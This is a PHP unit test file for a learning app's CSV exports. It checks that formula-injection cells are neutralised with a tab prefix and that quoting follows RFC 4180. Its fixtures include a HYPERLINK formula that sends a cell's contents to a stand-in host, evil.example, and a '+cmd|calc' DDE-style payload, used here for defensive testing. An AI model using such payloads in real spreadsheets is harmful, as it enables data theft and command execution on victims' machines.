<?php
declare(strict_types=1);

namespace OCA\Learning\Tests\Unit\Controller;

use OCA\Learning\Controller\CertificateReportController;
use OCA\Learning\Controller\CourseController;
use OCA\Learning\Controller\SummaryController;
use OCA\Learning\Db\CourseMapper;
use OCA\Learning\Db\CourseMemberMapper;
use OCA\Learning\Service\CourseArchiveService;
use OCA\Learning\Service\CertificateReportService;
use OCA\Learning\Service\CourseService;
use OCA\Learning\Service\CsvFormulaGuard;
use OCA\Learning\Service\KeyService;
use OCA\Learning\Service\CourseSummaryService;
use OCA\Learning\Service\ExamAttemptPolicy;
use OCA\Learning\Service\PassCriteriaService;
use OCA\Learning\Service\RoleService;
use OCA\Learning\Service\ScheduleService;
use OCA\Learning\Service\TelosService;
use OCP\AppFramework\Http\DataDownloadResponse;
use OCP\IRequest;
use PHPUnit\Framework\Attributes\AllowMockObjectsWithoutExpectations;
use PHPUnit\Framework\TestCase;
use Psr\Log\LoggerInterface;

/**
 * 2026-11 audit (S13): the at-risk CSV wrote the learner's self-chosen display name unfiltered, so a
 * name like "=HYPERLINK(...)" became a live formula in the instructor's spreadsheet. Every string
 * cell starting with = + - @ gets the same tab prefix CertificateReportController already uses.
 */
#[AllowMockObjectsWithoutExpectations]
class CsvFormulaInjectionTest extends TestCase {

    private function courseController(CourseService $courseService): CourseController {
        return new CourseController(
            'learning',
            $this->createMock(IRequest::class),
            $this->createMock(CourseMapper::class),
            $this->createMock(CourseMemberMapper::class),
            $this->createMock(CourseArchiveService::class),
            $courseService,
            $this->createMock(RoleService::class),
            $this->createMock(ScheduleService::class),
            $this->createMock(PassCriteriaService::class),
            $this->createMock(ExamAttemptPolicy::class),
            $this->createMock(\OCA\Learning\Service\CourseEnrollmentService::class),
            $this->createMock(LoggerInterface::class),
            'teacher'
        );
    }

    public function testAtRiskExportNeutralisesFormulaCells(): void {
        $courseService = $this->createMock(CourseService::class);
        $courseService->method('getAtRiskStudents')->willReturn(['at_risk' => [[
            'user_id' => 'mallory',
            'display_name' => '=HYPERLINK("https://evil.example/?"&A2,"klick")',
            'risk_level' => 'high',
            'critical_cards_count' => 3,
            'risk_reasons' => ['+cmd|calc', 'low accuracy'],
            'accuracy' => 12,
            'last_active' => '@SUM(1)',
        ]]]);

        $resp = $this->courseController($courseService)->exportAtRiskCsv(7);

        self::assertInstanceOf(DataDownloadResponse::class, $resp);
        $csv = $resp->render();
        $lines = explode("\n", trim($csv));
        $cells = str_getcsv($lines[1], ',', '"', '\\');
        self::assertSame("\t=HYPERLINK(\"https://evil.example/?\"&A2,\"klick\")", $cells[0]);
        self::assertSame("\t+cmd|calc; low accuracy", $cells[3]);
        self::assertSame("\t@SUM(1)", $cells[5]);
        // harmless cells stay as they were, numbers are not touched
        self::assertSame('high', $cells[1]);
        self::assertSame('3', $cells[2]);
        self::assertSame('12', $cells[4]);
    }

    /**
     * Audit #172: the export passed no $escape, so PHP's backslash escape applied — a quote right
     * after a backslash was not doubled and spreadsheets (RFC 4180, no escape character) split the
     * cell. The exports now write plain RFC 4180 like DataMobilityService does.
     */
    public function testAtRiskExportWritesRfc4180ForBackslashQuote(): void {
        $courseService = $this->createMock(CourseService::class);
        $courseService->method('getAtRiskStudents')->willReturn(['at_risk' => [[
            'user_id' => 'alex',
            'display_name' => 'Alex \\"the\\" Demo',
            'risk_level' => 'low',
        ]]]);

        $lines = explode("\n", trim($this->courseController($courseService)->exportAtRiskCsv(7)->render()));

        $cells = str_getcsv($lines[1], ',', '"', '');
        self::assertSame('Alex \\"the\\" Demo', $cells[0]);
        self::assertSame('low', $cells[1]);
    }

    public function testClassSummaryExportNeutralisesFormulaUserIds(): void {
        $courseService = $this->createMock(CourseService::class);
        $courseService->method('findById')->willReturn(['is_instructor' => true]);
        $summary = $this->createMock(CourseSummaryService::class);
        $summary->method('getClassSummary')->willReturn(['students' => [
            '-cmd' => ['xp' => ['total_xp' => 10]],
            'bob' => [],
        ]]);
        $controller = new SummaryController(
            'learning',
            $this->createMock(IRequest::class),
            $summary,
            $courseService,
            $this->createMock(TelosService::class),
            'teacher'
        );

        $resp = $controller->exportCsv(7);

        self::assertInstanceOf(DataDownloadResponse::class, $resp);
        $lines = explode("\n", trim($resp->render()));
        self::assertSame("\t-cmd", str_getcsv($lines[1], ',', '"', '\\')[0]);
        self::assertSame('10', str_getcsv($lines[1], ',', '"', '\\')[1]);
        self::assertSame('bob', str_getcsv($lines[2], ',', '"', '\\')[0]);
    }

    /**
     * Audit #138: every export writes RFC 4180 with an explicit empty escape character. With
     * fputcsv's default escape ("\\") a field containing \" was written without doubling the
     * quote, so it came back torn apart — and PHP 8.4 deprecates relying on that default.
     */
    public function testCsvLineDoublesEveryQuoteAndTreatsBackslashAsText(): void {
        $line = CsvFormulaGuard::line(['C:\\path\\"quoted"', 'plain']);

        self::assertSame('"C:\\path\\""quoted""",plain', $line);
        self::assertSame(['C:\\path\\"quoted"', 'plain'], str_getcsv($line, ',', '"', ''));
    }

    /** Audit #138/#139: the certificate report CSV uses the shared writer (guard + RFC 4180). */
    public function testCertificateReportCsvUsesTheSharedWriter(): void {
        $report = $this->createMock(CertificateReportService::class);
        $report->method('getCourseReport')->willReturn(['rows' => [[
            'display_name' => 'Anna \\"Ace\\" Muster',
            'passed_at' => 1700000000,
            'score' => '=1+1',
            'expires_at' => null,
            'verification_id' => 'vid-1',
        ]]]);
        $request = $this->createMock(IRequest::class);
        $request->method('getParam')->willReturn(null);
        $controller = new CertificateReportController(
            'learning',
            $request,
            $report,
            $this->createMock(KeyService::class),
            $this->createMock(LoggerInterface::class),
            'teacher'
        );

        $resp = $controller->exportCertReportCsv(7);

        self::assertInstanceOf(DataDownloadResponse::class, $resp);
        $lines = explode("\n", $resp->render());
        $cells = str_getcsv($lines[1], ',', '"', '');
        self::assertSame('Anna \\"Ace\\" Muster', $cells[0]);
        self::assertSame("\t=1+1", $cells[2]);
    }
}
